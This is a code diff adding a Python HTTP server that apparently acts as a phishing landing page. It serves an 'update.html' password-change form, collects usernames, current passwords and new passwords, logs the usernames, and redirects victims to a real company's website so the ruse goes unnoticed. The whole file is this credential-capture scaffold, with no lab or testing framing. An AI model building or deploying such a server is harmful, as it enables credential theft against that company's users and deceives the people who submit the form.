@@ -1,0 +1,82 @@
+import logging
+from http.server import BaseHTTPRequestHandler, HTTPServer
+import urllib.parse
+
+class ElegantFormatter(logging.Formatter):
+    green = "\033[1;32m"
+    cyan = "\033[1;36m"
+    magenta = "\033[1;35m"
+    red = "\033[1;31m"
+    reset = "\033[0m"
+    custom_format = "%(asctime)s - %(levelname)s - %(message)s"
+
+    FORMATS = {
+        logging.INFO: green + custom_format + reset,
+        logging.DEBUG: cyan + custom_format + reset,
+        logging.WARNING: red + custom_format + reset,
+        logging.ERROR: red + custom_format + reset,
+    }
+
+    def format(self, record):
+        log_fmt = self.FORMATS.get(record.levelno)
+        formatter = logging.Formatter(log_fmt, "%Y-%m-%d %H:%M:%S")
+        return formatter.format(record)
+
+# Setup logging configuration
+logger = logging.getLogger()
+logger.setLevel(logging.INFO)
+handler = logging.StreamHandler()
+formatter = ElegantFormatter()  # Create an instance of your custom formatter
+handler.setFormatter(formatter)  # Set the formatter for the handler
+logger.addHandler(handler)
+
+# Define colors globally if you want to use them outside the formatter
+colors = {
+    'green': "\033[1;32m",
+    'cyan': "\033[1;36m",
+    'magenta': "\033[1;35m",
+    'reset': "\033[0m"
+}
+
+class MyRequestHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        if self.path == '/':
+            self.send_response(200)
+            self.send_header('Content-type', 'text/html')
+            self.end_headers()
+            with open('update.html', 'rb') as file:
+                self.wfile.write(file.read())
+            logger.info("Successfully served 'update.html'.")
+        else:
+            self.send_error(404, "Page Not Found")
+
+    def do_POST(self):
+        if self.path == '/submit':
+            content_length = int(self.headers['Content-Length'])
+            post_data = self.rfile.read(content_length).decode('utf-8')
+            post_data = urllib.parse.parse_qs(post_data)
+            
+            username = post_data.get('username', [''])[0]
+            password = post_data.get('password', [''])[0]
+            newpassword = post_data.get('newpassword', [''])[0]
+
+            logger.info(f"Processing submit request with data: Username: {colors['cyan']}{username}{colors['reset']}, Password: {colors['magenta']}***{colors['reset']}, New Password: {colors['magenta']}***{colors['reset']}")
+            self.send_response(302)
+            self.send_header('Location', 'https://protalix.com/')
+            self.end_headers()
+        else:
+            self.send_error(404, "Invalid request")
+
+def run():
+    server_class = HTTPServer
+    handler_class = MyRequestHandler
+    port = 5050
+    server_address = ('', port)
+    httpd = server_class(server_address, handler_class)
+    logger.info(f"{colors['magenta']}Server starting on port {port}{colors['reset']}")
+    httpd.serve_forever()
+
+if __name__ == "__main__":
+    run()
+
+
